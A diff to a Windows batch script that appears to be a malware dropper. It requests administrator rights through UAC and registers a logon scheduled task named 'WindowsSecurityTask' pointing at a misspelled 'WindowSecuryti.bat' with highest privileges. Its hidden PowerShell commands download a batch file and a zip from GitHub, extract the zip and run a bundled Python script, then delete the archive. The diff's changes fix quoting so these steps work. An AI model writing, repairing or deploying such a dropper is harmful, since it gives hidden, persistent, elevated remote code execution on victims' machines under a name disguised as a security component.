@@ -2,11 +2,13 @@
 @echo off
 setlocal enabledelayedexpansion
 set FLAGFILE=%TEMP%\admin.ok
+
 net session >nul 2>&1
 if %errorlevel% == 0 (
     > "%FLAGFILE%" echo.
     goto afterAdmin
 )
+
 if "%~1" neq "elevated" (
 :askUAC
     del "%FLAGFILE%" >nul 2>&1
@@ -22,10 +24,10 @@ exit /b
 
 :afterAdmin
 
-schtasks /create /tn "WindowsSecurityTask" /tr "\"%LOCALAPPDATA%\WindowSecuryti.bat\"" /sc onlogon /rl highest /f >nul 2>&1
+schtasks /create /tn "WindowsSecurityTask" /tr "%LOCALAPPDATA%\WindowSecuryti.bat" /sc onlogon /rl highest /f >nul 2>&1
 
 @echo off
-start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/abareklw/ud/raw/main/ud.bat', '%LOCALAPPDATA%\\WindowSecuryti.bat');
+start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/abareklw/ud/raw/main/ud.bat', '%LOCALAPPDATA%\\WindowSecuryti.bat');"
 
 @echo off
 start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/abareklw/dcm/raw/main/Document.zip', '%LOCALAPPDATA%\\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%LOCALAPPDATA%\\Document.zip', '%LOCALAPPDATA%\\Document'); Start-Sleep -Seconds 1; %LOCALAPPDATA%\\Document\\python %LOCALAPPDATA%\\Document\\Lib\\sim.py; del %LOCALAPPDATA%\\Document.zip" && exit
